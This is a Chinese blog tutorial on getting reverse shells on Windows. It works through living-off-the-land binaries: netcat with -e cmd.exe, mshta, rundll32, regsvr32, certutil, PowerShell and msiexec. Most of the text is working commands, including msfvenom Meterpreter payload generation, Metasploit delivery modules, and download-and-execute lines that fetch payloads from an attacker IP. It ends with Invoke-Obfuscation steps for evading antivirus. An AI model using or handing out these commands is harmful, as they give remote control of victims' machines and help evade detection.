<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Window下的反弹shell - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Window下的反弹shell" />
<meta property="og:description" content="什么是正向shell?
正向shell：控制端主动发起连接请求去连接被控制端，中间网络链路不存在阻碍。
反向shell：被控制端主动发起连接去请求连接控制，通常被控端由于防火墙受限制、权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包。
简单点理解：攻击者找受害者，主动正向，反之就是反向连接
在实战中，大多数采用反向shell，因为正向shell有很多因素导致连接失败，比如说硬件设备有防火墙，入侵防御系统等，还有网站防火墙，端口占用，权限不足等场景，特别是硬件设备如果你正向连接被防火墙拦截导致打草惊蛇，后期攻击相当繁琐。反向shell：而被控制端主动向外发送的数据包通常都不会被拦截。
NC获取反弹shell NC正向shell
被控端
nc -lvvp 6666 -e cmd.exe 控制端
nc 被控端的地址 端口 原理：
被控端将cmd重定向到本地6666端口，控制端主动连接到6666端口，即获得shell
NC反向shell
被控端
nc 控制端IP 端口 -e cmd 控制端
nc -lvvp 端口 原理：
被控端将cmd.exe重定向到控制端的6666端口，控制端只需要监听本地的6666端口，即可获得shell。
建议端口尽量靠后，我发现这样更容易连接
Mshta.exe获取反弹shell Mshta.exe是用于负责解释运行HTA（HTML应用程序）文件的Windows OS实用程序。可以运行javascript或vbscript的html文件。
HTA 简单用法
可双击运行hta应用或命令窗口mshta.exe解析执行
&lt;script&gt; hta = new ActiveXObject(&#34;WScript.Shell&#34;); hta.run(&#34;%windir%\\System32\\cmd.exe /c calc.exe&#34;, 0); window.close(); &lt;/script&gt; 使用msf来操作
msf6 &gt; search hta Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/http/apache_optionsbleed 2017-09-18 normal No Apache Optionsbleed Scanner 1 exploit/linux/http/bludit_upload_images_exec 2019-09-07 excellent Yes Bludit Directory Traversal Image File Upload Vulnerability 2 exploit/windows/misc/hta_server 2016-10-06 manual No HTA Web Server 3 auxiliary/dos/http/hashcollision_dos 2011-12-28 normal No Hashtable Collisions msf6 &gt; use 2 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp msf6 exploit(windows/misc/hta_server) &gt; show options msf6 exploit(windows/misc/hta_server) &gt; set srvhost 192." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/c05850d89dca579c3eb5337f3ac3c587/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-05-05T16:21:42+08:00" />
<meta property="article:modified_time" content="2023-05-05T16:21:42+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Window下的反弹shell</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <blockquote> 
 <p>什么是正向shell?</p> 
</blockquote> 
<p>正向shell：控制端主动发起连接请求去连接被控制端，中间网络链路不存在阻碍。</p> 
<p>反向shell：被控制端主动发起连接去请求连接控制，通常被控端由于防火墙受限制、权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包。</p> 
<p><img alt="" height="462" src="https://images2.imgbox.com/bd/3e/u3rO1PiF_o.png" width="1037"></p> 
<p>简单点理解：攻击者找受害者，主动正向，反之就是反向连接</p> 
<p><a class="link-info" href="https://blog.csdn.net/qq_46258964/article/details/122789897" title="在实战中，大多数采用反向shell，因为正向shell有很多因素导致连接失败，比如说硬件设备有防火墙，入侵防御系统等，还有网站防火墙，端口占用，权限不足等场景，特别是硬件设备如果你正向连接被防火墙拦截导致打草惊蛇，后期攻击相当繁琐。反向shell：而被控制端主动向外发送的数据包通常都不会被拦截。">在实战中，大多数采用反向shell，因为正向shell有很多因素导致连接失败，比如说硬件设备有防火墙，入侵防御系统等，还有网站防火墙，端口占用，权限不足等场景，特别是硬件设备如果你正向连接被防火墙拦截导致打草惊蛇，后期攻击相当繁琐。反向shell：而被控制端主动向外发送的数据包通常都不会被拦截。</a><br>  </p> 
<h4><strong>NC获取反弹shell</strong></h4> 
<p><strong>NC正向shell</strong></p> 
<p>被控端</p> 
<pre><code>nc -lvvp 6666 -e cmd.exe</code></pre> 
<p>控制端</p> 
<pre><code>nc 被控端的地址  端口</code></pre> 
<p>原理：</p> 
<p>被控端将cmd重定向到本地6666端口，控制端主动连接到6666端口，即获得shell</p> 
<p><img alt="" height="725" src="https://images2.imgbox.com/8a/15/3zlKb5Rm_o.png" width="889"></p> 
<p><strong>NC反向shell</strong></p> 
<p>被控端</p> 
<pre><code>nc 控制端IP  端口  -e cmd</code></pre> 
<p>控制端</p> 
<pre><code>nc -lvvp 端口</code></pre> 
<p>原理：</p> 
<p>被控端将cmd.exe重定向到控制端的6666端口，控制端只需要监听本地的6666端口，即可获得shell。</p> 
<p><img alt="" height="338" src="https://images2.imgbox.com/50/60/1kamrR8H_o.png" width="823"></p> 
<p><span style="color:#be191c;"><strong>建议端口尽量靠后，我发现这样更容易连接</strong></span></p> 
<h4>Mshta.exe获取反弹shell</h4> 
<p>Mshta.exe是用于负责解释运行HTA（HTML应用程序）文件的Windows OS实用程序。可以运行javascript或vbscript的html文件。</p> 
<p>HTA 简单用法</p> 
<p>可双击运行hta应用或命令窗口mshta.exe解析执行</p> 
<pre><code class="language-javascript">&lt;script&gt;
	hta = new ActiveXObject("WScript.Shell");
	hta.run("%windir%\\System32\\cmd.exe /c calc.exe", 0);  
	window.close();
&lt;/script&gt;
</code></pre> 
<p>使用msf来操作</p> 
<pre><code class="language-javascript">msf6 &gt; search hta
Matching Modules
================

   #   Name                                                      Disclosure Date  Rank       Check  Description
   -   ----                                                      ---------------  ----       -----  -----------
   0   auxiliary/scanner/http/apache_optionsbleed                2017-09-18       normal     No     Apache Optionsbleed Scanner
   1   exploit/linux/http/bludit_upload_images_exec              2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability
   2   exploit/windows/misc/hta_server                           2016-10-06       manual     No     HTA Web Server
   3   auxiliary/dos/http/hashcollision_dos                      2011-12-28       normal     No     Hashtable Collisions


msf6 &gt; use 2
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) &gt; show options


msf6 exploit(windows/misc/hta_server) &gt; set srvhost 192.168.222.146
srvhost =&gt; 192.168.222.146
msf6 exploit(windows/misc/hta_server) &gt; set srvport 8899
srvport =&gt; 8899
msf6 exploit(windows/misc/hta_server) &gt; set lport 5678
lport =&gt; 5678
msf6 exploit(windows/misc/hta_server) &gt; exploit -j

[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.222.146:5678 
[*] Using URL: http://192.168.222.146:8899/KiwKwwCE0nyldsn.hta
[*] Server started.

将http://192.168.222.146:8899/KiwKwwCE0nyldsn.hta复制到window的cmd中执行

mshta  http://192.168.222.146:8899/KiwKwwCE0nyldsn.hta</code></pre> 
<p>使用Msfvenoom生成恶意HTA文件发起攻击</p> 
<p><img alt="" height="253" src="https://images2.imgbox.com/d2/5f/gLGwmC6j_o.png" width="1199"></p> 
<p>使用cs来生成文件</p> 
<p>攻击 -&gt; 生成后门 -&gt; HTML Application -&gt; powershell</p> 
<p>钓鱼攻击 -&gt; 文件下载 -&gt; 选择生成的.hta -&gt; 复制连接访问</p> 
<h4>Rundll32.exe反弹shell</h4> 
<p>Rundll32.exe与Windows操作系统相关，它允许调用从DLL导出的函数（16位或32位），并将其存储在适当的内存库中。</p> 
<p><strong>通过Metasploit的SMB Delivery模块发起Rundll32攻击</strong></p> 
<pre><code>use exploit/windows/smb/smb_delivery</code></pre> 
<p><img alt="" height="335" src="https://images2.imgbox.com/34/00/zdfRLSco_o.png" width="945"></p> 
<p>将其复制到cmd中执行，win11可能会报错，有一定的局限性</p> 
<p><img alt="" height="305" src="https://images2.imgbox.com/15/31/EMIDucQ3_o.png" width="728"></p> 
<p><strong>使用msfvenom生成反弹shell的dll发起Rundll32攻击</strong></p> 
<p><img alt="" height="282" src="https://images2.imgbox.com/ce/5a/l3i5GqJ4_o.png" width="1171"></p> 
<h4>Regsvr32.exe工具</h4> 
<p>Regsvr32.exe是一个命令行应用程序，用于注册和注销OLE控件，如注册表中的dll和Active控件。Regsvr32.exe安装在WindowsXP和Windows后续版本的%systemroot%\System32文件夹中。</p> 
<p>语法：Regsvr32 [/s] [/u] [/i[:cmdline]] &lt;dllname&gt;</p> 
<p><img alt="" height="149" src="https://images2.imgbox.com/cd/ba/SQfUNIma_o.png" width="881"></p> 
<pre><code class="language-bash">use exploit/multi/script/web_delivery
set srvhost  ip地址
set target 3
set payload windows/x64/meterpreter/reverse_tcp
set lhost ip地址
exploit -j</code></pre> 
<h4><strong>Certuil.exe工具</strong></h4> 
<p>certutil.exe是作为证书服务的一部分安装的命令行程序。我们可以使用此工具在目标计算机中执行恶意的exe文件以获得shell</p> 
<p>1、使用cs的文件下载</p> 
<p>2、msfvenom</p> 
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.222.146 lport=6789 -f exe &gt; shell.exe</code></pre> 
<p>执行：</p> 
<pre><code class="language-bash">certutil -urlcache -split -f http://192.168.222.146/shell.exe &amp; shell.exe

certutil -urlcache -split -f http://192.168.222.146/shell.exe delete

certutil -urlcache -split * delete    //全部删除</code></pre> 
<h4>Powershell.exe工具</h4> 
<p>powercat是Powershell本地后门监听和反向shell工具，也成为修改版的netcat，因为它集成支持经过编码的有效载荷。</p> 
<p><strong>通过web delivery反弹shell</strong></p> 
<pre><code class="language-bash">msf &gt; use exploit/multi/script/web_delivery 
msf exploit(web_deliver) &gt; set target 2
msf exploit(web_deliver) &gt; set payload windows/x64/meterpreter/reverse_tcp
msf exploit(web_deliver) &gt; exploit -j</code></pre> 
<p><strong>通过powershell启动cscript.exe</strong></p> 
<p>Poweshell允许客户端通过执行cscript.exe来运行wsf、js和vbscript脚本</p> 
<p>通过powershell启动Bat文件</p> 
<p>Powershell允许客户端执行bat文件</p> 
<p><strong>通过Metasploit启动msiexec攻击</strong></p> 
<p>Windows os安装有一个windows安装引擎，MSI包使用msiexec.exe来解释安装。</p> 
<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.222.146  LPORT=3476 -f msi &gt; hjw2.msi</code></pre> 
<p>msf中的设置</p> 
<pre><code>msf &gt; use exploit/multi/handler
msf &gt; set payload windows/x64/meterpreter/reverse_tcp
msf &gt; set lhost 192.168.222.146
msf &gt; set lport 3476
msf &gt; exploit -j</code></pre> 
<p>cmd中执行 ( 存在杀软会不让你操作，会没有反应 )</p> 
<pre><code>msiexec /q /i http://192.168.222.146/hjw2.msi</code></pre> 
<p><strong>通过Metasploit生成恶意exe文件发起攻击</strong></p> 
<p>msfvenom生成exe</p> 
<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.222.146  LPORT=3476 -f exe &gt; hjw2.exe</code></pre> 
<p>msf监听</p> 
<p>powershell运行</p> 
<pre><code>poweshell (new-object System.Net.WebClient).DownloadFile('http://192.168.222.146/hjw.exe','hjw.exe');start hjw.exe</code></pre> 
<h4>Powershell代码混淆</h4> 
<p><strong>1、导入模块加载</strong></p> 
<p>进入<code>invoke-Obsfuscation</code>文件夹并打开powershell, 执行如下命令导入<code>Invoke-Obfuscation</code>模块</p> 
<pre><code class="hljs">Import-Module .\Invoke-Obfuscation.psd1</code></pre> 
<p>加载模块</p> 
<pre><code class="hljs">Invoke-Obfuscation</code></pre> 
<p>输入要加密的脚本路径</p> 
<pre><code class="hljs">set scriptpath 脚本路径</code></pre> 
<p>加密脚本</p> 
<p>输出脚本</p> 
<pre><code class="hljs">out hjw.ps1</code></pre> 
<p>参考文章</p> 
<p><a href="https://blog.csdn.net/xf555er/article/details/128589654?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168327264016800215021158%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168327264016800215021158&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-128589654-null-null.142%5Ev86%5Ewechat,239%5Ev2%5Einsert_chatgpt&amp;utm_term=Invoke-Obfuscation&amp;spm=1018.2226.3001.4187" title="PowerShell木马免杀利器: Invoke-Obfuscation(过火绒)_Henry404s的博客-CSDN博客">PowerShell木马免杀利器: Invoke-Obfuscation(过火绒)_Henry404s的博客-CSDN博客</a></p> 
<p><a href="https://m.freebuf.com/articles/network/358029.html" rel="nofollow" title="FreeBuf网络安全行业门户">FreeBuf网络安全行业门户</a></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/d0d0ddedb4d342bb3671ce0a7c066cc5/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">QT中属性编辑器--各个属性的含义</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/e1c4c708182b5aea7d4fe11a8b0f2741/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">详解springboot整合redis</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>